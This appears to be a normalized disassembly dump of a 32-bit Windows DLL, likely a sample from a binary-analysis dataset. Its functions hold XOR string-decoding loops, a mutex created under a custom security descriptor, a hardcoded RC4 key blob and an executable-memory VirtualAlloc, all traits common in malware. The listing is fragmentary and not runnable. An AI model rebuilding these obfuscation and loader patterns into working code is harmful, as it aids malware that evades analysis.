call [ InitializeSecurityDescriptor@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push edi
mov edx [ ebp - 0x1c ]
push ebx
push edx
push 0x1
push esi
call [ SetSecurityDescriptorDacl@IAT ]
test eax eax
jne r-xdata
push esi
push ebx
push edi
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x14 ]
push ecx
call [ FreeSid@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x18 ]
push ecx
xor eax eax
push ebx
lea edx [ ebp - 0x28 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
push edx
mov [ ebp - 0x28 ] 0xc
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
call [ CreateMutexW@IAT ]
push esi
push ebx
mov [ ebp - 0x18 ] eax
push edi
cmp eax ebx
je r-xdata
push esi
push ebx
push edi
call [ HeapFree@IAT ]
mov eax [ ebp - 0x14 ]
push eax
call [ FreeSid@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
call [ HeapFree@IAT ]
mov eax [ ebp - 0x14 ]
push eax
call [ FreeSid@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call [ FreeSid@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x18 ]
push ecx
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x18 ]
push ecx
call [ CloseHandle@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_100536c0
push ebp
mov ebp esp
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov ebx ecx
mov ecx [ r--data ]
xor edi edi
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x61
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x10
jb r-xdata
xor eax eax
lea edx [ ebp - 0x80 ]
push edx
mov [ ebp - 0x8 ] ax
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x28 ]
mov [ ebp - 0x80 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov esi [ ebp - 0x80 ]
call sub_1004df80
mov esi eax
mov eax [ ebp - 0x80 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp esi edi
je r-xdata
mov esi 0x1
lea edx [ ebp - 0x78 ]
lea eax [ esi + 0x46 ]
call sub_100050e0
mov eax esi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x7c ]
push edx
lea edx [ ebp - 0x28 ]
mov [ ebp - 0x7c ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x47
call sub_100050e0
mov eax esi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov esi [ ebx + 0x130 ]
cmp esi edi
je r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x7c ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
mov edi [ esi ]
lea ecx [ ebp - 0x7c ]
push ecx
call sub_10053d90
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_100537f0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax esi
pop edi
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
push 0x0
call sub_1003c700
sub_10053845
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_10022818
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_10053890
push ebp
mov ebp esp
push 0xffffffff
push sub_10082fd1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x31c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x304 ] edi
mov [ ebp - 0x308 ] eax
mov ebx ecx
mov [ ebp - 0x324 ] edi
mov [ ebp - 0x320 ] edi
mov [ ebp - 0x31c ] edi
mov ecx 0x7
mov edx 0x1
mov [ ebp - 0x4 ] edx
xor esi esi
mov [ ebp - 0x2e4 ] ecx
mov [ ebp - 0x2c8 ] ecx
mov [ ebp - 0x2a8 ] ecx
mov [ ebp - 0x28c ] ecx
xor ecx ecx
mov [ ebp - 0x2e8 ] edi
mov [ ebp - 0x2f8 ] si
mov [ ebp - 0x2cc ] edi
mov [ ebp - 0x2dc ] si
mov [ ebp - 0x2ac ] edi
mov [ ebp - 0x2bc ] si
mov [ ebp - 0x290 ] edi
mov [ ebp - 0x2a0 ] cx
mov [ ebp - 0x4 ] 0x2
mov [ eax ] edi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] edi
push edx
mov [ ebp - 0x304 ] edx
push edi
lea edx [ ebp - 0x2fc ]
push edx
mov ecx ebx
mov [ ebp - 0x2fc ] 0x3b
call sub_10040200
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov al [ ebp + 0xc ]
mov ecx [ r--data ]
mov [ ebp - 0x2fc ] al
mov [ ebp - 0x300 ] 0x1
xor eax eax
mov [ ebp - 0x2fc ] 0x3b
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffcb
and edx 0xff
mov [ ebp + eax * 2 - 0x4c ] dx
inc eax
cmp eax 0x1d
jb r-xdata
mov ecx [ ebp - 0x304 ]
mov ebx [ ebp - 0x324 ]
mov edi [ ebp - 0x320 ]
push ecx
xor eax eax
push ebx
mov ecx edi
mov [ ebp - 0x12 ] ax
call sub_10001000
add esp 0x8
mov esi ebx
mov [ ebp - 0x30c ] ebx
cmp ebx edi
je r-xdata
mov eax esi
sub eax edi
push eax
push edi
push ebx
lea ecx [ ebp - 0x274 ]
mov [ ebp - 0x260 ] 0xf
mov [ ebp - 0x264 ] 0x0
mov [ ebp - 0x274 ] 0x0
call sub_100417c0
lea ecx [ ebp - 0x274 ]
lea edi [ ebp - 0x324 ]
mov [ ebp - 0x4 ] 0x3
call sub_10041240
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x260 ] 0x10
jb r-xdata
lea esi [ ebp - 0x2f8 ]
call sub_10054dd0
test ebx ebx
je r-xdata
lea edx [ ebp - 0x2f8 ]
push edx
mov ecx esi
call sub_10019350
add esp 0x4
test eax eax
jne r-xdata
push 0x1
lea edi [ esi + 0x1 ]
push edi
lea edx [ ebp - 0x2fc ]
push edx
mov ecx ebx
call sub_10040200
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x274 ]
push ecx
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x308 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov esi ebx
cmp ebx edi
je r-xdata
add esi 0x1c
mov [ ebp - 0x30c ] esi
cmp esi edi
jne r-xdata
mov eax [ ebp - 0x300 ]
push eax
lea ecx [ ebp - 0x4c ]
push ecx
mov ecx 0x25
lea ebx [ ebp - 0x258 ]
call sub_10041b00
mov eax ebx
add esp 0x8
lea edx [ eax + 0x2 ]
push ebx
call sub_1006591f
add esp 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x258 ]
push edx
lea ecx [ ebp - 0x2f8 ]
call sub_100531b0
mov al [ ebp - 0x2fc ]
mov esi [ ebp - 0x308 ]
mov [ ebp - 0x284 ] al
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x2f8 ]
cmp ecx eax
jae r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
add esi 0x1c
cmp esi edi
jne r-xdata
mov edx [ esi ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ esi + 0x8 ]
cmp eax ecx
jne r-xdata
mov edx [ esi ]
cmp edx ecx
ja r-xdata
mov eax [ esi + 0x4 ]
mov [ ebp - 0x314 ] eax
mov [ ebp - 0x310 ] eax
mov [ ebp - 0x4 ] 0x5
test eax eax
je r-xdata
mov edx [ esi ]
sub eax edx
sar eax 0x7
cmp eax 0x1fffffe
ja r-xdata
mov ebx ecx
mov ecx [ esi + 0x8 ]
sub ebx edx
cmp eax ecx
jne r-xdata
inc [ ebp - 0x300 ]
mov [ ebp - 0x4 ] 0x2
sub [ esi + 0x4 ] 0xffffff80
inc [ ebp - 0x2fc ]
mov ebx [ ebp - 0x324 ]
mov edi [ ebp - 0x320 ]
mov esi [ ebp - 0x30c ]
lea edi [ ebp - 0x2f8 ]
push r--data
call sub_1002c5ed
sub ecx edx
inc eax
sar ecx 0x7
cmp eax ecx
jbe r-xdata
mov eax [ esi + 0x4 ]
and ebx 0xffffff80
add ebx [ esi ]
mov [ ebp - 0x310 ] eax
mov [ ebp - 0x314 ] eax
mov [ ebp - 0x4 ] 0x4
test eax eax
je r-xdata
sub eax edx
sar eax 0x7
cmp eax 0x1fffffe
ja r-xdata
mov edx ecx
shr edx 0x1
mov edi 0x1ffffff
sub edi edx
cmp edi ecx
jae r-xdata
mov edi ebx
jmp r-xdata
sub ecx edx
inc eax
sar ecx 0x7
cmp eax ecx
jbe r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push eax
call sub_1003d790
mov edx ecx
shr edx 0x1
mov edi 0x1ffffff
sub edi edx
cmp edi ecx
jae r-xdata
push ecx
mov ecx esi
call sub_10034170
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
mov ecx esi
call sub_10034170
mov ecx eax
cmp ecx eax
jae r-xdata
sub_10053c70
push esi
mov esi eax
mov eax [ edi + 0x4 ]
cmp esi eax
jae r-xdata
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ecx [ edi ]
cmp ecx esi
ja r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx edi
call sub_1005d500
sub esi ecx
sar esi 0x3
cmp eax [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x8
pop esi
retn
mov ecx [ esi ]
mov [ eax ] ecx
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_1005d500
mov eax [ edi ]
mov edx [ eax + esi * 8 ]
mov [ ecx ] edx
mov eax [ eax + esi * 8 + 0x4 ]
mov [ ecx + 0x4 ] eax
add [ edi + 0x4 ] 0x8
pop esi
retn
sub_10053cd0
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ r--data ]
push esi
mov esi ecx
movsx ecx [ eax ]
xor ecx 0xff9d
and ecx 0xff
lea eax [ ebp - 0x210 ]
push eax
xor edx edx
mov [ ebp - 0x210 ] cx
mov ecx eax
push ecx
mov [ ebp - 0x20e ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x1
push 0x1
push eax
lea eax [ ebp - 0x20c ]
call sub_1002ed80
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
lea edx [ eax + 0x2 ]
lea ecx [ ecx ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x20c ]
push ecx
lea ecx [ esi + 0x70 ]
call sub_100531b0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10053d90
push ebp
mov ebp esp
sub esp 0xd8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx 0x3
mov [ ebp - 0xd8 ] eax
xor eax eax
mov [ ebp - 0x1c ] cx
mov ecx [ r--data ]
push esi
mov [ ebp - 0xd0 ] eax
mov [ ebp - 0xd4 ] eax
lea ebx [ ebx ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffd6
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ ebx + 0x1c ]
xor eax eax
mov [ ebp - 0x36 ] ax
mov esi [ ecx ]
lea edx [ ebp - 0xd0 ]
push edx
mov edx [ ebp - 0x1c ]
push r--data
lea eax [ ebp - 0x48 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4 ] edx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xd0 ]
jns r-xdata
lea edx [ ebp - 0xc4 ]
mov [ ebp - 0xc4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0xa3
call sub_100050e0
mov esi [ edi + 0x4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xc4 ]
push edx
push ebx
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0x90 ]
mov eax 0x120
jmp r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0x55
call sub_100050e0
mov eax 0x1
pop esi
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x1c ]
mov eax 0x45
call sub_100050e0
mov esi [ edi + 0x8 ]
mov eax edx
push eax
lea ecx [ ebp - 0xc4 ]
push ecx
push ebx
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0xa5
jmp r-xdata
call sub_100050e0
lea edx [ ebp - 0x34 ]
mov eax 0xdd
call sub_100050e0
mov esi [ edi + 0xc ]
push edx
lea eax [ ebp - 0xc4 ]
push eax
push ebx
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0x12c
jmp r-xdata
mov eax [ ebp - 0xd0 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xc4 ] 0x0
mov edx [ edi + 0x18 ]
lea ecx [ ebp - 0xcc ]
push ecx
push 0x0
push 0x80000000
push edx
mov [ ebp - 0xcc ] 0x0
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0xcc ] 0x0
jne r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x48
jmp r-xdata
lea edx [ ebp - 0xc0 ]
mov eax 0xfb
call sub_100050e0
mov esi [ ebp - 0xcc ]
mov eax edx
push eax
lea ecx [ ebp - 0xc4 ]
push ecx
push ebx
call sub_10022870
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xcc ] eax
mov edx [ ebp - 0xcc ]
push edx
call [ SysFreeString@IAT ]
fld [ edi + 0x10 ]
lea eax [ ebp - 0xc8 ]
push eax
push 0x0
push 0x80000000
sub esp 0x8
fstp [ esp ]
mov [ ebp - 0xc8 ] 0x0
call [ VarBstrFromR8@IAT ]
cmp [ ebp - 0xc8 ] 0x0
jne r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0xeb
call sub_100050e0
lea edx [ ebp - 0x58 ]
mov eax 0x33
call sub_100050e0
mov esi [ ebp - 0xc8 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xc4 ]
push edx
push ebx
call sub_10022870
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xc8 ] eax
mov eax [ ebp - 0xc8 ]
push eax
call [ SysFreeString@IAT ]
mov ecx [ ebp - 0xd8 ]
mov eax [ ecx ]
mov edx [ eax ]
mov edx [ edx + 0x54 ]
lea ecx [ ebp - 0xd4 ]
push ecx
mov ecx [ ebp - 0xd0 ]
push ecx
push eax
call edx
mov eax [ ebp - 0xd4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0xaa
call sub_100050e0
lea edx [ ebp - 0xac ]
mov eax 0x8c
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xd4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc4 ]
test eax eax
je r-xdata
sub_100540c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080908
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi edx
cmp esi edi
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1006bc40
mov esi [ esi ]
test esi esi
je r-xdata
lea esp [ esp ]
push 0x40
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov [ edi ] ebx
xor eax eax
mov ecx [ esi ]
push ecx
mov ecx eax
call sub_100121d0
jmp r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
cmp [ edi ] 0x0
mov ebx eax
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebx ] eax
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_10054170
push ebp
mov ebp esp
push 0xffffffff
push sub_10081d57
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ edi ] 0x0
mov eax [ edx + 0x20 ]
mov [ edi + 0x4 ] eax
lea ecx [ edi + 0x4 ]
xor eax eax
mov esi 0xf
mov [ edi + 0x1c ] esi
mov [ edi + 0x18 ] eax
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] edx
mov [ edi + 0x8 ] al
mov [ ebp - 0x4 ] eax
mov [ edi + 0x38 ] esi
mov [ edi + 0x34 ] eax
mov [ edi + 0x24 ] al
mov [ edi + 0x40 ] eax
mov [ edi + 0x44 ] eax
mov edx [ edx + 0x30 ]
mov [ edi + 0x48 ] edx
mov [ edi + 0x4c ] eax
mov [ edi + 0x50 ] eax
mov [ edi + 0x54 ] eax
mov [ edi + 0x58 ] eax
mov edx 0x7
xor esi esi
mov [ edi + 0x74 ] edx
mov [ edi + 0x70 ] eax
mov [ edi + 0x60 ] si
mov [ edi + 0x90 ] edx
mov [ edi + 0x8c ] eax
mov [ edi + 0x7c ] ax
push 0x4
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x4
call sub_10041110
add esp 0x4
push eax
lea ecx [ edi + 0x8 ]
mov [ ebp - 0x4 ] 0x5
call sub_1000adb0
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ebx [ ebp - 0x30 ]
push ebx
lea esi [ ebp - 0x2c ]
call sub_100348b0
push eax
lea ecx [ edi + 0x24 ]
mov [ ebp - 0x4 ] 0x6
call sub_1000adb0
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1006591f
add esp 0x4
mov eax [ edi + 0x48 ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ edi + 0x40 ] eax
mov [ edi ] 0x1
mov ecx [ ebx + 0x28 ]
add ecx eax
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_1006591f
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebx + 0x24 ]
add [ edi + 0x44 ] edx
mov eax [ ebx + 0x24 ]
mov edx [ ebx + 0x34 ]
push eax
push edx
push ecx
call sub_100796a0
mov ecx ebx
add esp 0xc
lea ebx [ edi + 0x50 ]
call sub_10044860
mov edx [ edi + 0x48 ]
cmp [ edi + 0x44 ] edx
jne r-xdata
mov ecx [ edi + 0x40 ]
call sub_1004a310
mov [ edi + 0x4c ] eax
sub_100542e0
push esi
mov esi eax
mov eax [ esi ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call edi
cmp [ esi + 0x10 ] 0x0
je r-xdata
push eax
call edi
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov [ esi + 0x10 ] 0x0
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call edi
cmp [ esi + 0x50 ] 0x0
je r-xdata
push eax
call edi
add esi 0x54
cmp [ esi ] 0x0
je r-xdata
mov [ esi + 0x50 ] 0x0
pop edi
pop esi
retn
call sub_10024550
sub_1005434f
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1005a415
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_10054403
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x10 ]
mov eax [ ebp + 0x8 ]
cmp eax edx
ja r-xdata
push [ ebp + 0xc ]
sub eax edx
push eax
call sub_100550c4
push 0xffffffff
push eax
call sub_1005721e
jmp r-xdata
pop ebp
retn 0x8
sub_1005442b
push 0x4
mov eax sub_1007f6d3
call sub_100097c8
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_1004c578
mov eax esi
call sub_1004db01
retn 0x8
sub_10054460
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov ecx [ edi + 0x28 ]
push 0xffffffff
mov [ esi + 0x28 ] ecx
mov edx [ edi + 0x48 ]
push 0x0
lea eax [ edi + 0x2c ]
push eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x48 ] edx
call sub_10019180
mov ecx [ edi + 0x4c ]
mov [ esi + 0x4c ] ecx
mov edx [ edi + 0x50 ]
mov [ esi + 0x50 ] edx
mov eax [ edi + 0x58 ]
mov [ esi + 0x58 ] eax
mov ecx [ edi + 0x5c ]
mov [ esi + 0x5c ] ecx
mov edx [ edi + 0x68 ]
mov ecx [ esi + 0x90 ]
mov [ esi + 0x68 ] edx
mov eax [ edi + 0x6c ]
push ecx
push 0x0
mov [ esi + 0x6c ] eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ edi + 0x94 ]
mov eax [ edi + 0x90 ]
mov ecx [ esi + 0x90 ]
push edx
push eax
push ecx
call sub_100796a0
mov edx [ edi + 0x94 ]
mov eax [ esi ]
mov [ esi + 0x94 ] edx
mov edx [ eax + 0x8 ]
add esp 0xc
mov ecx esi
call edx
cmp [ edi + 0x98 ] 0x0
je r-xdata
mov eax [ edi + 0x9c ]
mov [ esi + 0x9c ] eax
mov eax [ edi + 0x9c ]
push 0x40
push 0x3000
push eax
push 0x0
call [ VirtualAlloc@IAT ]
mov [ esi + 0x98 ] eax
mov ecx [ edi + 0x94 ]
mov edx [ edi + 0x98 ]
push ecx
push edx
push eax
call sub_100796a0
add esp 0xc
sub_10054550
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10053183
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_1005457d
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_10008757
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100545a0
push ebp
mov ebp esp
push 0xffffffff
push sub_100805a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x4
xor ebx ebx
push ebx
mov esi ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] r--data
jmp r-xdata
push 0x1c
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x2c ] 0x208
mov [ ebp - 0x28 ] 0x6801
mov [ ebp - 0x24 ] 0x10
mov [ ebp - 0x20 ] 0x526278b5
mov [ ebp - 0x1c ] 0xd7243e98
mov [ ebp - 0x18 ] 0x7ceec63b
mov [ ebp - 0x14 ] 0x6291edb9
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
push edi
push esi
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x30 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x30 ]
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
call sub_100264c0
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x34 ]
cmp ecx ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
xor eax eax
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax 0x2
jmp r-xdata
